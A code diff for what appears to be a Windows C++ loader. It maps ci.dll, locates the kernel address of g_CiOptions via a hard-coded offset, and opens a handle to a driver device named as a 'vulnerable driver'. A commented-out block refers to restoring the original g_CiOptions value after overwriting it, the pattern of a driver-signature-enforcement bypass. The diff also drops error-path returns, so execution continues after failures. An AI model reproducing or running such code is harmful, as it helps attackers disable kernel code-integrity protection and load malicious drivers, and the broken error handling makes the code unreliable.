@@ -11,76 +11,95 @@ int main() {
     void* mappedBase = nullptr;
     std::wstring ciPath = L"C:\\Windows\\System32\\ci.dll";
 
-    // Step 1: Map ci.dll file into memory
+    // Step 1: Map ci.dll into memory
     if ( !loader::MapCiDllToMemory( ciPath, mappedBase ) ) {
-        std::cerr << "[-] ci.dll mapping failed." << std::endl;
+        std::cerr << "[-] ci.dll mapping failed.\n";
         system( "pause" );
-        return 1;
     }
 
-    // Parse headers from mapped image
+    // Step 2: Parse PE headers
     auto dos = reinterpret_cast< PIMAGE_DOS_HEADER >( mappedBase );
     if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) {
-        std::cerr << "[-] Invalid DOS signature." << std::endl;
+        std::cerr << "[-] Invalid DOS signature.\n";
         UnmapViewOfFile( mappedBase );
         system( "pause" );
-        return 1;
     }
 
     auto nt = reinterpret_cast< PIMAGE_NT_HEADERS >(
         reinterpret_cast< BYTE* >( mappedBase ) + dos->e_lfanew );
     if ( nt->Signature != IMAGE_NT_SIGNATURE ) {
-        std::cerr << "[-] Invalid NT signature." << std::endl;
+        std::cerr << "[-] Invalid NT signature.\n";
         UnmapViewOfFile( mappedBase );
         system( "pause" );
-        return 1;
     }
 
-    std::wcout << L"[+] Entry point RVA: 0x" << std::hex
-        << nt->OptionalHeader.AddressOfEntryPoint << std::endl;
-
-    // Step 1b: Get export address RVA of CiValidateImageHeader
-    uintptr_t exportRva = loader::HdnGetProcAddress( mappedBase, L"CiValidateImageHeader" );
-    if ( exportRva == 0 ) {
-        std::wcout << L"[-] CiValidateImageHeader not found in export table." << std::endl;
+    // Step 3: Resolve exports
+    uintptr_t validateRVA = loader::HdnGetProcAddress( mappedBase, L"CiValidateImageHeader" );
+    if ( !validateRVA ) {
+        std::wcout << L"[-] CiValidateImageHeader not found.\n";
         UnmapViewOfFile( mappedBase );
         system( "pause" );
-        return 1;
     }
-    std::wcout << L"[+] CiValidateImageHeader RVA: 0x" << std::hex << exportRva << std::endl;
 
-    // Step 2: Get kernel mode ci.dll base address (Ci! base)
+    std::wcout << L"[+] CiValidateImageHeader RVA: 0x" << std::hex << validateRVA << std::endl;
+
     uintptr_t kernelCiBase = loader::GetCiDllKernelBase();
-    if ( kernelCiBase == 0 ) {
-        std::cerr << "[-] Failed to find kernel ci.dll base address." << std::endl;
+    if ( !kernelCiBase ) {
+        std::cerr << "[-] Failed to find kernel ci.dll base address.\n";
         UnmapViewOfFile( mappedBase );
         system( "pause" );
-        return 1;
-    }
-    std::wcout << L"[+] Kernel-mode ci.dll base: 0x" << std::hex << kernelCiBase << std::endl;
-
-    // Step 3: Get CiInitialize RVA and VA
-    uintptr_t CiInitRVA = loader::HdnGetProcAddress( mappedBase, L"CiInitialize" );
-    if ( CiInitRVA ) {
-        std::wcout << L"[+] CiInitialize RVA: 0x" << std::hex << CiInitRVA << std::endl;
-        std::wcout << L"[+] CiInitialize VA (userland mapped): 0x" << std::hex
-            << ( reinterpret_cast< uintptr_t >( mappedBase ) + CiInitRVA ) << std::endl;
     }
 
-    // Step 4: Find g_CiOptions runtime address using known fixed offset
-    uintptr_t g_CiOptionsAddr = loader::FindCiOptions( mappedBase, kernelCiBase );
-    if ( g_CiOptionsAddr != 0 ) {
-        std::wcout << L"[+] g_CiOptions runtime kernel VA: 0x" << std::hex << g_CiOptionsAddr << std::endl;
-    }
-    else {
-        std::wcout << L"[-] Failed to find g_CiOptions." << std::endl;
-    }
+    std::wcout << L"[+] Kernel ci.dll base: 0x" << std::hex << kernelCiBase << std::endl;
 
-    // Cleanup
+    uintptr_t g_CiOptionsVA = loader::FindCiOptions( mappedBase, kernelCiBase );
     UnmapViewOfFile( mappedBase );
 
-    HANDLE hDevice = CreateFileW(
-        L"\\\\.\\dbutil_2_3",                    // Device name for gdrv.sys vulnerable driver
+    if ( !g_CiOptionsVA ) {
+        std::cerr << "[-] Failed to find g_CiOptions kernel VA.\n";
+        system( "pause" );
+    }
+
+    std::wcout << L"[+] g_CiOptions kernel VA: 0x" << std::hex << g_CiOptionsVA << std::endl;
+
+    // Step 4: Open handle to kldbgdrv.sys
+    HANDLE hDev = CreateFileW( L"\\\\.\\kldbgdrv", GENERIC_READ | GENERIC_WRITE,
+        0, nullptr, OPEN_EXISTING, 0, nullptr );
+    if ( hDev == INVALID_HANDLE_VALUE ) {
+        std::cerr << "[-] Failed to open handle to kldbgdrv.sys. Error: " << GetLastError() << std::endl;
+        system( "pause" );
+        return 0;
+    }
+    std::cout << "[+] Opened handle to kldbgdrv.sys\n";
+
+
+    CloseHandle( hDev );
+    std::cout << "[+] Done.\n";
+    system( "pause" );
+    return 0;
+}
+
+
+
+
+uintptr_t loader::FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase ) {
+    // Fixed offset of g_CiOptions inside ci.dll image
+    uintptr_t MappedCiOptions = 0x2a308; // offset of g_CiOptions inside the mapped image
+
+    // Calculate runtime kernel address of g_CiOptions
+    uintptr_t gCiOptionsAddress = kernelBase + MappedCiOptions;
+
+    std::cout << "[+] g_CiOptions offset stored in MappedCiOptions: 0x"
+        << std::hex << MappedCiOptions << std::endl;
+
+    std::cout << "[+] Calculated gCiOptions runtime kernel address: 0x"
+        << std::hex << gCiOptionsAddress << std::endl;
+
+    return gCiOptionsAddress;
+}
+
+/*    HANDLE hDevice = CreateFileW(
+        L"\\\\.\\WinRing0",                    // Device name for gdrv.sys vulnerable driver
         GENERIC_READ | GENERIC_WRITE,
         0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
     );
@@ -124,26 +143,4 @@ int main() {
     }
     std::cout << "[+] Restored original g_CiOptions value: 0x" << std::hex << oldCiOptions << std::endl;
 
-    CloseHandle( hDevice );
-    std::cout << "[+] Done." << std::endl;
-    system( "pause" );
-    return 0;
-}
-
-
-
-uintptr_t loader::FindCiOptions( LPVOID mappedCiDll, uintptr_t kernelBase ) {
-    // Fixed offset of g_CiOptions inside ci.dll image
-    uintptr_t MappedCiOptions = 0x2a308; // offset of g_CiOptions inside the mapped image
-
-    // Calculate runtime kernel address of g_CiOptions
-    uintptr_t gCiOptionsAddress = kernelBase + MappedCiOptions;
-
-    std::cout << "[+] g_CiOptions offset stored in MappedCiOptions: 0x"
-        << std::hex << MappedCiOptions << std::endl;
-
-    std::cout << "[+] Calculated gCiOptions runtime kernel address: 0x"
-        << std::hex << gCiOptionsAddress << std::endl;
-
-    return gCiOptionsAddress;
-}
+    CloseHandle( hDevice );*/
